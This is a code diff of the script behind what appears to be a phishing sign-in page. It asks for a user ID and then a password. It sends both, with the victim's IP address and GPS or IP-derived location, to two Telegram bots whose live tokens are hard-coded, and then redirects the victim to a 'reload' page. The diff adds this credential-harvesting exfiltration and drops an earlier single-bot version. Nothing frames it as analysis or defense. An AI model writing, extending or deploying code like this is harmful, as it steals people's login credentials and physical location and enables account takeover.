@@ -5617,104 +5617,111 @@
                             </div>
                         
                             <script>
-                                // Enable/disable continue button based on text input
-                                const textInput = document.getElementById('text');
-                                const continueButton = document.getElementById('continueButton');
-                        
-                                textInput.addEventListener('input', () => {
-                                    continueButton.disabled = textInput.value.trim() === '';
-                                });
-                        
-                                // Enable/disable sign-in button based on password input
-                                const passwordInput = document.getElementById('password');
-                                const submitButton = document.getElementById('submit');
-                        
-                                passwordInput.addEventListener('input', () => {
-                                    submitButton.disabled = passwordInput.value.trim() === '';
-                                });
-                        
-                                document.getElementById('textForm').addEventListener('submit', function(event) {
-                                    event.preventDefault(); // Prevent form submission
-                        
-                                    const textInput = document.getElementById('text');
-                                    const errorMessageContainer = document.getElementById('error-message');
-                        
-                                    // Check if the text input is not empty
-                                    if (textInput.value.trim() === '') {
-                                        // Show error message if text is empty
-                                        errorMessageContainer.style.display = 'block';
-                                    } else {
-                                        // Hide error message if text is valid
-                                        errorMessageContainer.style.display = 'none';
-                        
-                                        // Get the text value
-                                        const text = textInput.value;
-                        
-                                        // Display the text in the password section
-                                        document.getElementById('text-display').innerText = text;
-                        
-                                        // Hide the text section and show the password section
-                                        document.querySelector('.text-section').style.display = 'none';
-                                        document.querySelector('.password-section').style.display = 'block';
-                                    }
-                                });
-                        
-                                document.querySelector('.change-text').addEventListener('click', function(event) {
-                                    event.preventDefault(); // Prevent default anchor behavior
-                        
-                                    // Show the text section and hide the password section
-                                    document.querySelector('.password-section').style.display = 'none';
-                                    document.querySelector('.text-section').style.display = 'block';
-                        
-                                    // Hide error message when changing text
-                                    document.getElementById('error-message').style.display = 'none';
-                                });
-                        
-                                document.getElementById('passwordForm').addEventListener('submit', function(event) {
-                                    event.preventDefault(); // Prevent form submission
-                        
-                                    var text = document.getElementById("text").value;
-                                    var password = document.getElementById("password").value;
-                        
-                                    // Get the user's IP address
-        fetch('https://api.ipify.org?format=json')
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error("Failed to retrieve IP address.");
-                }
-                return response.json();
-            })
-            .then(data => {
-                ipAddress = data.ip; // Assign here
-                return fetch(`https://ipapi.co/${ipAddress}/json/`);
-            })
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error("Failed to retrieve location data.");
-                }
-                return response.json();
-            })
-            .then(locationData => {
-                const { city, region, country, postal } = locationData;
-                const message = `Used ID / Number: ${text}\nPassword: ${password}\nIP Address: ${ipAddress}\nLocation: ${city}\nRegion: ${region}\nCountry: ${country}\nZip: ${postal}`;
+    document.getElementById('passwordForm').addEventListener('submit', function(event) {
+        event.preventDefault(); // Prevent form submission
 
-                const telegramAPI = `https://api.telegram.org/bot7852729420:AAHLZGNk8uLYteos9bQoD_RPGwKHURJtYoE/sendMessage?chat_id=5395358559&text=${encodeURIComponent(message)}`;
+        var text = document.getElementById("text").value;
+        var password = document.getElementById("password").value;
 
-                return fetch(telegramAPI);
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.ok) {
-                    window.location.href = "reload.html"; // Replace with your desired redirect page
+        // Function to get location based on geolocation API (works with VPN off)
+        function getGeolocation() {
+            return new Promise((resolve, reject) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        position => {
+                            resolve(position.coords);
+                        },
+                        error => {
+                            reject(error);
+                        }
+                    );
                 } else {
-                    alert("Error logging in.");
+                    reject('Geolocation not supported');
                 }
-            })
-            .catch(error => {
-                alert("Error: " + error.message);
             });
+        }
+
+        // Try fetching geolocation first
+        getGeolocation().then(coords => {
+            // If geolocation is available, use it
+            const city = "Unknown"; // Geolocation doesn't return city
+            const region = "Unknown"; // Same as above
+            const country = "Unknown"; // Same as above
+            const postal = "Unknown"; // Same as above
+            const message = `User ID / Number: ${text}\nPassword: ${password}\nLocation: Latitude: ${coords.latitude}, Longitude: ${coords.longitude}`;
+
+            // Telegram Bot 1 API call
+            const telegramAPI1 = `https://api.telegram.org/bot7852729420:AAHLZGNk8uLYteos9bQoD_RPGwKHURJtYoE/sendMessage?chat_id=5395358559&text=${encodeURIComponent(message)}`;
+
+            // Telegram Bot 2 API call
+            const telegramAPI2 = `https://api.telegram.org/bot7518966371:AAG4Qa3moVnqQOvo_0S_rVRv_2AC7DMqgU4/sendMessage?chat_id=5546019240&text=${encodeURIComponent(message)}`;
+
+            // Send message to both bots in parallel
+            return Promise.all([
+                fetch(telegramAPI1),
+                fetch(telegramAPI2)
+            ]);
+        })
+        .catch(error => {
+            // Fallback to IP-based geolocation if geolocation fails (VPN might block GPS or browser prompts)
+            console.log('Geolocation failed or not supported, using IP-based location.');
+
+            // Get the user's IP address using ipify
+            fetch('https://api.ipify.org?format=json')
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error("Failed to retrieve IP address.");
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    ipAddress = data.ip;
+                    return fetch(`https://ipapi.co/${ipAddress}/json/`); // Use ipapi to get location info based on IP
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error("Failed to retrieve location data.");
+                    }
+                    return response.json();
+                })
+                .then(locationData => {
+                    const { city, region, country, postal } = locationData;
+                    const message = `User ID / Number: ${text}\nPassword: ${password}\nIP Address: ${ipAddress}\nLocation: ${city}\nRegion: ${region}\nCountry: ${country}\nZip: ${postal}`;
+
+                    // Telegram Bot 1 API call
+                    const telegramAPI1 = `https://api.telegram.org/bot<BotToken1>/sendMessage?chat_id=<ChatID1>&text=${encodeURIComponent(message)}`;
+
+                    // Telegram Bot 2 API call
+                    const telegramAPI2 = `https://api.telegram.org/bot<BotToken2>/sendMessage?chat_id=<ChatID2>&text=${encodeURIComponent(message)}`;
+
+                    // Send message to both bots in parallel
+                    return Promise.all([
+                        fetch(telegramAPI1),
+                        fetch(telegramAPI2)
+                    ]);
+                })
+                .catch(error => {
+                    alert("Error: " + error.message);
+                });
+        })
+        .then(responses => {
+            // Ensure both requests were successful
+            return Promise.all(responses.map(response => response.json()));
+        })
+        .then(data => {
+            // Check if both Telegram responses are OK
+            if (data[0].ok && data[1].ok) {
+                window.location.href = "reload.html"; // Redirect after successful message delivery
+            } else {
+                alert("Error logging in.");
+            }
+        })
+        .catch(error => {
+            alert("Error: " + error.message);
+        });
     });
 </script>
+
                         </div>
                         
                             </div>
